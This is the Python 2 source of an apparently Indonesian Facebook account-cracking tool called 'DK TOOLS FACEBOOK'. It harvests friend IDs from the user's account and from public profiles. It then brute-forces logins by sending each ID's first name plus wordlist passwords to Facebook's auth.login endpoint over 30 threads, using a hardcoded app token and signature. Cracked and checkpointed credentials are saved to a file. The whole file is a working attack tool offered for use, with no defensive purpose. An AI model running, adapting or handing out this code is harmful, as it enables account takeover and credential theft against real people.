#!/usr/bin/python
#coding: UTF-8
# created   : Tegar ID
# date      : 7 December 2020
# time      : 6:57 PM
# file name : main.py
# Comunity  : Dunia Kode
# ©Tegar ID All Right Reversed
# hanya orang biasa pencinta program
# programmer sejati

# recode gk akan menjadikan mu seorang programmer
# jadi mikir dulu kalo mau recode
# hargai karya orang maka kau juga akan di hargai

# import libraries
import os
from os import system as cistem
from time import sleep as detik
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
import sys,random,datetime,hashlib,threading,urllib,json,mechanize,requests,cookielib

# user agent
reload(sys)
sys.setdefaultencoding('utf8')
wk = mechanize.Browser()
wk.set_handle_robots(False)
wk.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
wk.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; CPH1923 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36')]

# banner
logo = """\033[31;1m
██████╗░██╗░░██╗████████╗███████╗
██╔══██╗██║░██╔╝╚══██╔══╝██╔════╝
██║░░██║█████═╝░░░░██║░░░█████╗░░
\033[37;1m██║░░██║██╔═██╗░░░░██║░░░██╔══╝░░
██████╔╝██║░╚██╗░░░██║░░░██║░░░░░
╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░

    \033[37;1m[\033[41;1m DK TOOLS FACEBOOK \033[00;1m\033[37;1m]
"""
no = []
id = []
oke = []
cp = []
idteman = []
idfromteman = []

def asup():
    cistem("clear")
    token=raw_input("token : ")
    try:
        gas = requests.get('https://graph.facebook.com/me?access_token='+token)
        j = json.loads(gas.text)
        simpen = open('.token.txt', 'w')
        simpen.write(token)
        simpen.close()
        print 'login berhasil'
        menu()
    except KeyError:
        print 'token tidak cocok'
        detik(2)
        asup()

def menu():
    cistem("clear")
    print logo
    try:
        token=open('.token.txt', 'r').read()
    except IOError:
        cistem("clear")
        cistem('rm -rf .token.txt')
        detik(2)
        asup()
    try:
        gas = requests.get('https://graph.facebook.com/me?access_token='+token)
        j = json.loads(gas.text)
        ngaran = j['name']
        aydi = j['id']
        milu = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + token)
        js = json.loads(milu.text)
        ikut = str(js['summary']['total_count'])
    except KeyError:
        cistem("clear")
        print 'token tidak cocok'
        detik(2)
        asup()
    except requests.exceptions.ConnectionError:
        print 'koneksi buruk'
    cistem('clear')
    print logo
    print 40*'\033[34;1m='
    print '\033[36;1mInfo Akun'
    print '\033[32;1mnama      \033[36;1m: \033[37;1m'+ngaran
    print '\033[32;1mid        \033[36;1m: \033[37;1m'+aydi
    print '\033[32;1mpengikut  \033[36;1m: \033[37;1m'+ikut
    print 40*'\033[34;1m='
    print '\n\033[37;1m[\033[42;1mMenu Pilihan\033[00;1m\033[37;1m]\n'
    print '\033[34;1m[\033[31;1m1\033[34;1m] \033[37;1mCrack File'
    print '\033[34;1m[\033[31;1m2\033[34;1m] \033[37;1mDump ID Teman'
    print '\033[34;1m[\033[31;1m3\033[34;1m] \033[37;1mDump ID Publik'
    print '\033[34;1m[\033[31;1m4\033[34;1m] \033[37;1mBuat Wordlist'
    print '\033[34;1m[\033[32;1m0\033[34;1m] \033[37;1mKembali'
    milih()

def milih():
    mil = raw_input('\n\033[32;1m==> \033[37;1m')
    if mil == '':
        print '\033[31;1misi yang bener'
        milih()
    elif mil == '1':
        crackFile()
    elif mil == '2':
        dumpID()
    elif mil == '3':
        dumpPublik()
    elif mil == '4':
        buatWordlist()
    elif mil == '0':
        cistem("clear")
        hps = raw_input('\033[34;1mApakah mau menghapus token?\033[32;1m(\033[37;1my\033[36;1m/\033[37;1mn\033[32;1m) \033[31;1m: \033[37;1m')
        if hps == 'y' or hps == 'Y':
            cistem('rm -rf .token.txt')
            print '\033[31;1mMenghapus token'
        elif hps == 'n' or hps == 'N':
            print '\033[32;1mKeluar Program'
            exit()
    else:
        print '\033[32;1m'+mil+' \033[31;1mtidak ada'
        milih()

def buatWordlist():
    file = raw_input("\033[34;1mnama file \033[32;1m: \033[37;1m")
    simpen = open(file, 'a')
    jumlah = int(input("\033[34;1mjumlah data list \033[32;1m: \033[37;1m"))
    jmlh = jumlah + 1
    for x in range(1, jmlh):
        wordlist = raw_input("\033[34;1mlist password "+str(x)+" \033[32;1m: \033[37;1m")
        simpen.write(wordlist+'\n')
    simpen.close()
    print '\033[34;1mFile Disimpan di \033[32;1m: \033[37;1m'+file
    raw_input('\n\033[32;1m[<kembali>]')
    menu()

def crackFile():
    cistem('clear')
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        print '\033[31;1mtoken tidak cocok'
        cistem('rm -rf .token.txt')
        detik(0.01)
        asup()
    cistem("clear")
    print logo
    try:
        list = raw_input('\033[34;1mFile List ID \033[32;1m: \033[37;1m')
        for line in open(list,'r').readlines():
            id.append(line.strip())
    except KeyError:
        print '\033[37;1mFile gk ada'
        raw_input("\033[32;1m[<kembali>]")
        menu()
    except IOError:
        print '\033[31;1mFile tidak ada'
        raw_input("\033[32;1m[<kembali>]")
        menu()
    file = raw_input("\033[34;1mfile wordlist \033[32;1m: \033[37;1m")
    total = open(file, 'r')
    total = total.readlines()
    print '\033[34;1mTotal ID \033[32;1m: \033[37;1m' + str(len(id))
    print '\033[32;1mCTRL+Z Untuk Stop'
    def main(arg):
        global cp,oke
        jamet = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        sandi = open(file, 'r')
        for pw in sandi:
            try:
                pw = pw.replace('\n', '')
                an = requests.get('https://graph.facebook.com/'+jamet+'/?access_token='+token)
                j = json.loads(an.text)
                list1 = j['first_name'].lower()+pw
                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(jamet)+"&locale=en_US&password="+(list1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                ko = json.load(data)
                if 'access_token' in ko:
                    print ''
                    print '\n\033[32;1mBerhasil\033[37;1m'
                    print 'Nama      -> ' + j['name']
                    print 'ID        -> ' + jamet
                    print 'Sandi     -> ' + list1
                    print ''
                    sv = open('done/file.txt', 'a')
                    sv.write('\n\xe2\x9e\xa0 BERHASIL \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 ID       > ' + jamet + '\n\xe2\x9e\xa0 Sandi    > ' + list1 + '\n')
                    sv.close()
                    oke.append(jamet)
                else:
                    if 'www.facebook.com' in ko['error_msg']:
                        print ''
                        print '\n\033[31;1mCECKPOIN\033[37;1m'
                        print 'Nama      -> ' + j['name']
                        print 'ID        -> ' + jamet
                        print 'Sandi     -> ' + list1
                        print ''
                        sv = open('done/file.txt', 'a')
                        sv.write('\n\xe2\x9e\xa0 CEKPOIN \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 ID       > ' + jamet + '\n\xe2\x9e\xa0 Sandi    > ' + list1 + '\n')
                        sv.close()
                        cp.append(jamet)

            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n'+40*'\033[34;1m='
    print '\033[32;1mSelesai\033[37;1m'
    print 'save      : done/file.txt'
    print 'Cekpoin   : ' + str(len(cp))
    print 'Berhasil  : ' + str(len(oke))
    print 40*'\033[34;1m='
    balik = raw_input('\n\033[32;1m[<kembali>]\n')
    cistem('python2 krek_file.py')

def dumpID():
    cistem('clear')
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        print '\033[31;1mToken tidak cocok'
        cistem('rm -rf .token.txt')
        detik(0.01)
        cistem("python2 krek_file.py")
    try:
        os.mkdir('done')
    except OSError:
        pass
    try:
        cistem('clear')
        print logo
        print 40*'\033[34;1m='
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        z = json.loads(r.text)
        bz = open('done/id.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r[\033[32;1m' + str(len(idteman)) + '\033[37;1m]\033[31;1m ->\033[37;1m',
            sys.stdout.flush()
            detik(0.005)
            print '\033[37;1m' + a['id']
        bz.close()
        print '\r\033[34;1mTotal ID \033[32;1m: \033[37;1m%s' % len(idteman)
        simpen = raw_input('\r\033[34;1mSave ke => Nama File \033[32;1m: \033[37;1m')
        os.rename('done/id.txt', 'done/' + simpen)
        print '\r\033[34;1mFile disimpan \033[32;1m: \033[37;1mdone/' + simpen
        print 40*'='
        balik = raw_input('\n\033[32;1m[<kembali>]')
        cistem('python2 krek_file.py')
    except IOError:
        print "\033[31;1mtidak dapat membuat file"
        balik = raw_input('\n\033[32;1m[<kembali>]')
        menu()
    except (KeyboardInterrupt, EOFError):
        print '\033[31;1mberhenti'
        balik = raw_input('\n\033[32;1m[<kembali>]')
        menu()
    except KeyError:
        print '\033[31;1mError'
        raw_input('\n\033[32;1m[<back>]')
        menu()
    except OSError:
        print "\033[31;1mGagal ngesave"
        balik = raw_input('\n\033[32;1m[<kembali>]\n')
        cistem('python2 krek_file.py')
    except requests.exceptions.ConnectionError:
        print '\033[31;1mKoneksi gagal'
        detik(2)
        menu()

def dumpPublik():
    cistem("clear")
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        cistem('clear')
        print 'Token tidak cocok'
        cistem('rm -rf .token.txt')
        time.sleep(1)
        cistem('python2 krek_file.py')
    try:
        os.mkdir('done')
    except OSError:
        pass

    try:
        cistem('clear')
        print logo
        id = raw_input('\033[34;1mMasukan ID Publik \033[32;1m: \033[37;1m')
        try:
            dp = requests.get('https://graph.facebook.com/' + id + '?access_token=' + token)
            y = json.loads(dp.text)
            print '\033[34;1mnama \033[32;1m: \033[37;1m' + y['name']
        except KeyError:
            print '\033[31;1mTeman Tidak ada'
            raw_input('\n\033[32;1m[<Kembali>]')
            menu()
        r = requests.get('https://graph.facebook.com/' + id + '?fields=friends.limit(5000)&access_token=' + token)
        z = json.loads(r.text)
        print '\033[37;1mproses mengambil ID'
        bz = open('done/id_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r[\033[32;1m' + str(len(idfromteman)) + '\033[37;1m]\033[31;1m -> \033[37;1m',
            sys.stdout.flush()
            detik(0.005)
            print '\033[37;1m' + a['id']
        bz.close()
        print '\r\033[32;1mBerhasil Dump ID'
        print '\r\033[34;1mTotal ID \033[32;1m: \033[37;1m%s' % len(idfromteman)
        done = raw_input('\r\033[34;1mSave ke ==> Nama File \033[32;1m: \033[37;1m')
        os.rename('done/id_teman.txt', 'done/' + done)
        print '\r\033[34;1mFile disimpan \033[32;1m: \033[37;1mdone/' + done
        raw_input('\n\033[32;1m[<Kembali>]')
        menu()
    except IOError:
        print "\033[31;1mtidak dapat membuat file"
        balik = raw_input('\n\033[32;1m[<kembali>]')
        menu()
    except (KeyboardInterrupt, EOFError):
        print '\033[31;1mberhenti'
        balik = raw_input('\n\033[32;1m[<kembali>]')
        menu()
    except KeyError:
        print '\033[31;1mError'
        raw_input('\n\033[32;1m[<back>]')
        menu()
    except OSError:
        print "\033[31;1mGagal ngesave"
        balik = raw_input('\n\033[32;1m[<kembali>]\n')
        cistem('python2 krek_file.py')
    except requests.exceptions.ConnectionError:
        print '\033[31;1mKoneksi gagal'
        detik(2)
        menu()

if __name__ == '__main__':
    menu()
